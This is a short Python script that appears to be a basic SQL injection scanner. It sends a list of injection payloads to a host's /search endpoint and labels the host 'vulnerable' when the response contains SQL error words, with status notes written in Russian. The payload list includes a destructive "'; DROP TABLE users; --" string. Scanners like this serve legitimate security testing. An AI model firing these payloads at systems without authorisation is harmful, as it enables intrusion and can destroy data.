import requests

PAYLOADS = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; DROP TABLE users; --"]

def check_sql(host):
    findings = []
    for payload in PAYLOADS:
        try:
            url = f'http://{host}/search'
            r = requests.get(url, params={'q': payload}, timeout=5)
            body = r.text.lower()
            errors = ['sql', 'syntax', 'mysql', 'sqlite', 'error', 'warning']
            if any(e in body for e in errors):
                findings.append({
                    'payload': payload,
                    'status': 'vulnerable',
                    'note': 'SQL ошибка в ответе'
                })
            else:
                findings.append({
                    'payload': payload,
                    'status': 'ok',
                    'note': 'Ответ без ошибок'
                })
        except Exception as e:
            findings.append({
                'payload': payload,
                'status': 'error',
                'note': str(e)
            })
    return findings